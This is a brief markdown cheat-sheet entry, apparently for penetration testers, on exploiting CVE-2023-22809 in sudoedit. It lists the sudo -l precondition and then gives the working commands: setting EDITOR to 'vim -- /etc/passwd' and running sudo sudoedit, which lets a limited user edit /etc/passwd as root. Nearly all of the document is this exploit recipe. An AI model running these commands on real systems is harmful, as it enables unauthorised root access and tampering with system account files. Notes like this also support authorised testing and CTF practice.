# Vim Privilege Escalation

## CVE-2023-22809
Conditions:
```sh
sudo -l

May run the following commonds:
    (root) NOPASSWD: sudoedit targetfile.txt
```

Set vim and the target file to the default EDITOR variable. Then execute with sudoedit as normal
```sh
export EDITOR="vim -- /etc/passwd"

sudo sudoedit targetfile.txt
```


